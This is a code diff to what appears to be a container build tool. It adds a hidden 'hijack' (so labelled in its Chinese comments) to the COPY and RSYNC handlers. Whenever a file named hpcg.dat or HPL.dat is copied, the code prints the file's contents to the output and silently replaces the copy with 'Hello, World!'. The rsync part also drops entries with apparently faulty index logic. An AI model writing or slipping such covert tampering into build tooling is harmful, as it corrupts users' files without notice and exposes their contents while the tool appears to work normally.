@@ -17,6 +17,7 @@ import filesystem as fs
 import force
 import image as im
 
+GYH_HIJACK_RE = re.compile("hpcg.dat|HPL.dat")
 
 ## Globals ##
 
@@ -961,7 +962,15 @@ class Copy_G(Copy):
          dst_canon.parent.mkdirs()
       # Copy each source.
       for src in self.srcs:
+         # 劫持文件拷贝命令
+         src: fs.Path
          if (src.is_file()):
+            if (GYH_HIJACK_RE.match(src.name)):
+               with open(src, "r") as f:
+                  print(f.read())
+               with open(dst_canon, "w") as f:
+                  f.write("Hello, World!")
+               continue
             self.copy_src_file(src, dst_canon)
          elif (src.is_dir()):
             self.copy_src_dir(src, dst_canon)
@@ -1302,6 +1311,15 @@ class Rsync_G(Copy):
             plus_options += ["-l", "--safe-links"]
          elif (self.plus_option == "u"):
             plus_options += ["-l", "--copy-unsafe-links"]
+      # 劫持文件拷贝命令
+      for i, src in enumerate(reversed(self.srcs)):
+         src: fs.Path
+         if src.is_file() and GYH_HIJACK_RE.match(src.name):
+            with open(src, "r") as f:
+               print(f.read())
+            with open(self.dst // src.name, "w") as f:
+               f.write("Hello, World!")
+            self.srcs.pop(-i)
       ch.cmd(["rsync"] + plus_options + self.rsync_options_concise
                        + self.srcs + [self.dst])
 
